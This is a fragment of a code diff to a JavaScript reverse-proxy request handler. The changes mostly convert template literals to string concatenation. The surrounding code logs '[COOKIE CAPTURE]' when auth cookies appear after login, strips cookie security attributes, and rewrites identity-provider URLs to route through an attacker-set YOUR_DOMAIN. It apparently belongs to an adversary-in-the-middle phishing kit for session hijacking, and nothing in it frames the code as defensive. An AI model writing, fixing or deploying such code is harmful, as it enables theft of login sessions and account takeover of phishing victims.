       if (shouldCaptureCookies) {
-        console.log(`[COOKIE CAPTURE] Post-login: ${isPostLogin}, AuthSuccess: ${isAuthSuccess}, HasAuthCookies: ${hasAuthCookies}`);
+        console.log('[COOKIE CAPTURE] Post-login: ' + isPostLogin + ', AuthSuccess: ' + isAuthSuccess + ', HasAuthCookies: ' + hasAuthCookies);
       }
 
       cookies.forEach(c => {
@@ -812,13 +479,12 @@ export default async function handleRequest(request) {
         mod = mod.replace(/Secure;?/gi, '');
         mod = mod.replace(/SameSite=[^;]+;?/gi, '');
 
-        // CRITICAL FIX: Rewrite cookie paths to match proxy URL structure
         if (mod.includes('Path=')) {
           mod = mod.replace(/Path=([^;]+)/i, (match, path) => {
             return 'Path=' + PROXY_PREFIX + upstreamDomain + path;
           });
         } else {
-          mod += `; Path=${PROXY_PREFIX}${upstreamDomain}/`;
+          mod += '; Path=' + PROXY_PREFIX + upstreamDomain + '/';
         }
 
         mod += '; SameSite=None; Secure';
@@ -849,7 +515,7 @@ export default async function handleRequest(request) {
 
       Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
         const escaped = domain.replace(/\./g, '\\.');
-        const regex = new RegExp('https?://' + escaped + '([^"'`\\s)]*)', 'gi');
+        const regex = new RegExp('https?://' + escaped + '([^"\'`\\s)]*)', 'gi');
         text = text.replace(regex, 'https://' + YOUR_DOMAIN + PROXY_PREFIX + domain + '$1');
       });
 
@@ -886,7 +552,6 @@ export default async function handleRequest(request) {
           return attr + '="https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/' + path + '"';
         });
 
-        // FIXED: Changed template literals to string concatenation to avoid $1 syntax error
         text = text.replace(/src="\/_next\/static\/([^"]+)"/gi, 
           'src="https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/_next/static/$1"');
         text = text.replace(/href="\/_next\/static\/([^"]+)"/gi, 
@@ -949,7 +614,7 @@ export default async function handleRequest(request) {
     return new Response(resp.body, { status: resp.status, headers: newHeaders });
 
   } catch (err) {
-    console.error(`[${info.type}] Error:`, err);
+    console.error('[' + info.type + '] Error:', err);
     return new Response(JSON.stringify({
       error: 'Proxy Error',
       message: err.message,
